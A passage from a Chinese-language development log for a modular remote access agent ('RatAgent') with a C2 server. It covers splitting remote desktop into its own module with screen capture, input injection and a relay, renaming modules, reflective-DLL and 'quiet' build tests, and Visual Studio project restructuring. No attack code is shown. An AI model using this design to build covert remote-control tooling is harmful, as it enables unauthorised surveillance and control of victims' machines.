| `scripts/e2e_rdll.py` | 反射加载全流程 + 跨进程停止 | ✅ ALL PASS |
| `scripts/e2e_quiet.py` | 静默构建（零输出零文件） | ✅ ALL PASS |

**硬指标达成**：模板工程**没有修改任何 core 文件**即可产出可上线、可应答自定义指令的新模块。

### 9.3 阶段 2：远程桌面拆成独立 agent（✅ 完成）

**动作**：把"远程桌面"整组从 `client/core` 用 `git mv` 搬到 `client/agents/screen/`
（保留历史），成为一个**独立 agent、直连 C2**（命令走自己的信道，数据继续走 4445 中继）：

| 搬到 `client/agents/screen/` | 说明 |
|---|---|
| `screen_spy.*` | 抓帧（GDI/DXGI） |
| `screen_stream.*` | 4445 长连接 + 帧上行 + 输入下行 |
| `input_replay.*` | SendInput 注入 |
| `desktop_switch.*` | 输入桌面切换 |
| `screen_module.*` | 能力注册（阶段 1 建的）+ `0x1001`/`0x1002` 指令实现 |
| `caps.cpp` | 工程级能力清单 → `screen_module_register()` |
| `RatAgent.screen.vcxproj` / `.exe.vcxproj` | 两个工程（模块 id `screen`，能力位 `kCapRemote`） |

同时：
- 全量 agent（`RatAgent.vcxproj` / `RatAgentDll.vcxproj`）**移除这 5 个源文件**与
  `windowscodecs` 链接；`caps_full.cpp` 变为"不登记额外能力"；
  `RatAgentModuleCaps` 默认改为 `(c2::kCapSys)`（full 不再宣称有远程桌面能力）；
- `ratctl` 的 `resolveAgent()` 支持**按模块标签**解析目标（`use screen` / `screen screen`），
  多台机器同名模块时报错并列出候选，要求改用 id 前缀。

**实测证据**

| 项 | 结果 |
|---|---|
| `python scripts/e2e_screen.py` | ✅ **ALL PASS**：full+screen 同机共存（`full.id`/`screen.id`、标签 `Windows (full)`/`Windows (screen)`、能力位 `0x1`/`0x2`）；screen 的 `0x1001` 截屏 **214 KB JPEG**；`0x1002` 开流后 C2 日志出现 `[stream] <id>: relay frame #1 (202 KB)`；从**另一个会话**停流生效且 4445 连接被移除；`use screen` / `use full` 标签解析生效；**full 上 `0x1001`/`0x1002` 均返回未知指令 `status=0x01`** |
| 回归 | `e2e_modules` / `e2e_template` / `e2e_rdll` / `e2e_quiet` 均 **ALL PASS** |

**依赖面收缩**（`dumpbin /dependents`）：全量 DLL 不再有 `GDI32`/`USER32`/`ole32`/`OLEAUT32`
（`windowscodecs` 是 COM 组件，本就不在导入表里）；体积 374,272 → **361,984 B**。
屏幕模块 DLL **378,880 B**（带 WIC/DXGI 依赖）。

### 9.4 后续（可选）

- 让 `screen` 模块也支持"注入/反射加载"交付（它已经是标准模块，可用 `tools/runpic` + RfUdrl 链 PIC）；
- beacon 信道的模块标签（需一次小的协议补充，见 §9.1 已知缺口）；
- 若不再需要"父模块管生命周期"，可评估阶段 5 的 IPC/hub 化（当前形态：模块各自直连 C2）。

### 9.5 模块改名：`full` → `sys`（✅ 完成）

阶段 2 把远程桌面拆走后，"全量"模块只剩**系统类**能力（sysinfo / exec / payload），名字与能力
不符，故按实际能力改名为 **`sys`**（与能力位 `kCapSys`、协议系统段 `0x3xxx` 一致）。

改动面（已全部同步）：

| 位置 | 改动 |
|---|---|
| `client/core/module_id.h` | `RAT_MODULE_ID` 默认值 → `"sys"` |
| `client/RatAgent.vcxproj` / `RatAgentDll.vcxproj` | `RatAgentModuleId` 默认值 → `sys` |
| `client/caps_full.cpp` → `client/caps_sys.cpp` | 能力清单文件改名（`git mv`，历史保留） |
| `scripts/e2e_*.py` | 模块名 / 文件名 / 标签断言 / 构建目录（`build/agent-full` → `build/agent-sys`） |
| README / DESIGN / 模板工程注释 | 同步为 `sys` |

**实测**：五个验收脚本全绿（`e2e_modules` / `e2e_template` / `e2e_screen` / `e2e_rdll` / `e2e_quiet`）；
命名空间文件变为 `sys.id` / `sys.log` / `sys.autostart.args`，C2 侧标签 `Windows (sys)`。

> 注意：§9.1–§9.3 的**实测记录**里模块名写的是当时的 `full`（以及 `Windows (full)`、`full.id` 等），
> 与今天的 `sys` 是同一个模块；**规则与用法一律以 `sys` 为准**。

### 9.6 解决方案结构 + 工程构建隔离（✅ 完成）

**起因**：在 VS2026 里打开解决方案时发现"根本看不出项目结构"，排查后确认三个问题：

| # | 问题 | 后果 |
|---|---|---|
| 1 | `RatAgent.sln` 里只有 2 个工程，screen/template 模块工程**从未加入** | 打开看不到多模块结构 |
| 2 | 6 个工程**都没设 `IntDir`** | 同一模块的 EXE/DLL 工程共用中间目录，而它们编译同一批 core 源码却用不同宏（`_CONSOLE` vs `_USRDLL/RAT_AGENT_DLL`）→ `.obj` 互相覆盖，**静默产出错误二进制**（例如 DLL 用上按 EXE 语义编的 `agent_runtime.obj`，默认 id 路径会变成 CWD 相对） |
| 3 | screen/template 的 EXE 与 DLL 工程用**同名 PDB** | 解决方案级构建时 6 个产物落同一输出目录，调试符号互相覆盖 |

**改动**
- `client/RatAgent.sln` → **`client/agents.sln`**：6 个工程按模块分到 `sys` / `screen` / `template`
  解决方案文件夹；另加 `core (shared)`（共享内核入口文件，说明它**没有独立工程**、被编进每个模块）
  与 `docs` 两个导航文件夹；工程显示名带形态（`RatAgent (exe)` / `RatAgentDll (dll)` /
  `RatAgent.screen (exe)` / `RatAgent.screen (dll)` …）。
- 6 个工程各加 `IntDir = $(ProjectName)\$(Platform)\$(Configuration)\`（互不相同的中间目录）。
- 符号文件与产物同名：`RatAgent.exe.pdb` / `RatAgent.dll.pdb` / `RatAgent.screen.exe.pdb` /
  `RatAgent.screen.dll.pdb` / `RatAgent.template.exe.pdb` / `RatAgent.template.dll.pdb`；
  导入库 `RatAgent.lib` / `RatAgent.screen.lib` / `RatAgent.template.lib`。

**实测**
- `MSBuild client\agents.sln -p:Configuration=Release -p:Platform=x64` → **exit=0，6 个工程全部产出**
  到 `client\x64\Release\`；
- `dumpbin /exports client\x64\Release\RatAgent.dll` → 导出 `StartAgent/StopAgent/StopAgentEx`
  ⇒ 确为真正的 DLL 构建，**未被 EXE 语义的 obj 污染**（IntDir 隔离生效）；
- 解决方案构建出的 `RatAgent.screen.exe` 实测上线：`os="Windows (screen)" plugins=0x00000002`；
- `client/x64/` 已被 `.gitignore` 覆盖，构建产物不会进仓库。

**后续**：工程文件名与产物名的统一见 §9.7。

### 9.7 工程文件名与产物名统一为 `RatAgent.<module>.<形态>`（✅ 完成）

§9.6 遗留的"工程文件名不自解释"已解决：sys 模块的工程与产物都带上模块名，
与 screen/template 的命名完全一致（显示名 = 产物名 = 工程文件名去掉 `.vcxproj`）。

| 旧 | 新 |
|---|---|
| `client/RatAgent.vcxproj` | `client/RatAgent.sys.exe.vcxproj`（EXE 形态） |
| `client/RatAgentDll.vcxproj` | `client/RatAgent.sys.vcxproj`（DLL 形态） |
| `RatAgent.exe` / `RatAgent.dll` | `RatAgent.sys.exe` / `RatAgent.sys.dll` |
| `RatAgent.exe.pdb` / `RatAgent.dll.pdb` | `RatAgent.sys.exe.pdb` / `RatAgent.sys.dll.pdb` |
| `RatAgent.lib`（DLL 导入库） | `RatAgent.sys.lib` |

**关键注意点**：工程文件名决定 MSBuild 的默认 `TargetName`。改成 `RatAgent.sys.exe.vcxproj` 后
默认会产出 `RatAgent.sys.exe.exe`，所以**必须显式写 `<TargetName>RatAgent.sys</TargetName>`**
（EXE 工程原先没有这个属性，DLL 工程原有的两处 `RatAgent` 也一并改为 `RatAgent.sys`）。

**同步范围**：`agents.sln`（工程路径 + 显示名 `RatAgent.sys (exe)` / `RatAgent.sys (dll)`）、
README、DESIGN、`client/core/agent_debug.h` 的构建示例、`agent_dll.cpp` / `main.cpp` 的文件头注释
（改成通用的 `RatAgent.<module>.dll` / `.exe`，因为它们被所有模块共用）、验收脚本
（`e2e_rdll` / `e2e_screen` / `e2e_modules`，以及早期的 `e2e_m1~m4`）。

> §8.x 与 §9.1–§9.3 的**实测记录**里出现的 `RatAgent.exe` / `RatAgent.dll` 是改名前的产物名，
> 与今天的 `RatAgent.sys.exe` / `RatAgent.sys.dll` 是同一个产物。
> （`e2e_m1~m4` 是早期脚本，除产物名外，其余路径仍是旧的 `bin/`、`client/x64/Debug/` 布局。）

### 9.8 工程内文件分组（过滤器）+ 工程结构自检（✅ 完成）

**起因**（用户反馈）：在 VS 里打开 `RatAgent.sys` 工程时所有文件**平铺**在一起——
`..\..\core\*.cpp`（共享内核）和模块自己的文件分不清来源，也看不出哪些是后加的。

**改动**

1. 6 个 `.vcxproj` 全部加入**按来源分组**的过滤器（VS 里就是两个文件夹）：

   | 分组 | 含义 |
   |---|---|
   | `core (shared)` | 共享内核：同一个 `client/core` 被**每个模块**编译进去（改它 = 改所有模块） |
   | `module (sys)` / `module (screen)` / `module (template)` | 只有本模块才有的文件 |

   每个 `ClCompile`/`ClInclude` 都挂了 `<Filter>`；screen/template 工程顺带补齐了自有头文件条目
   （原先只有 .cpp，头文件在 VS 里看不到）。
2. 修掉 **4 个陈旧引用**：sys 的两个工程里还列着 `core\screen_stream.h`、`core\screen_spy.h`、
   `core\desktop_switch.h`、`core\input_replay.h` —— 这些头文件在阶段 2 已搬到 `client/agents/screen/`。
3. 新增 **`scripts/check_projects.py`**（静态自检，不构建）：
   ① 每个 vcxproj 的 XML 是否合法 ② 引用的文件是否都存在 ③ 每个文件是否都分组、分组是否都已声明
   ④ 目录里有没有"游离文件"（写了文件却没进工程 ⇒ 漏编译）。

**过程记录（踩坑）**：我最初用 `<!-- ---- 分节 ---- -->` 当注释分隔线，而 **XML 注释不允许包含 `--`**，
6 个工程文件一度**全部非法**；是 `check_projects.py` 的 XML 校验当场抓出来的——这正是加这个脚本的理由。

**实测**
- `python scripts/check_projects.py` → **ALL PASS**（6 工程 × 4 项检查 + 3 个目录无游离文件）；
- `MSBuild client\agents.sln -p:Configuration=Release -p:Platform=x64` → **exit=0**（6 工程全部产出）；
- 五个验收套件（`e2e_modules` / `e2e_template` / `e2e_screen` / `e2e_rdll` / `e2e_quiet`）全绿。
